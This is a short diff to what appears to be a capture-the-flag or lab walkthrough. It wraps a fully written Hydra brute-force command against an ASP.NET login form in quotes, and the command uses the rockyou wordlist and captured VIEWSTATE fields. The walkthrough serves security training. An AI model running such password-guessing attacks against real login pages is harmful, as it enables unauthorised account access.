@@ -45,8 +45,10 @@ Login failed
  
  
 Combine the failed login message and the POST and VIEWSTATE fields to create the Hydra attack:
- 
+
+'''
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.176.34 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=VwAXG6ABUHHdsZyp9V5Zfa%2FQmIafRzp9ILoXJGVuXK8nUhCHtDfc4cAUkNeYybCBgFS7ttIKN9%2BL1TZYt9wc7ImbzKDO42jKqT4NzM2iK4qGYFdI5l7pg9jiSeKSYGI82ymoCvW67UVtpc1TE%2B1wg%2FuUJT23Wobx8ck39wYrMVKKYXRX&__EVENTVALIDATION=3FvnxLCU1vf%2FftSD5m08pwViCr63XR1GLrEKqv2qr42Hq8JQp2LWRA97rKzv1QZ1I8etW3igopbcuFlAq9be8kEAzsR5lfswhZLzLPLpwJrudjeGAiqRUNtpYvd2OfVPGKlinHl3CuVaVXXWfMEWJuKroB6hY9%2BlMqRgvnn3xhT%2Bzmv0&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+'''
  
 Note: ^USER^ and ^PASS^ must be used to use the username and password list
  
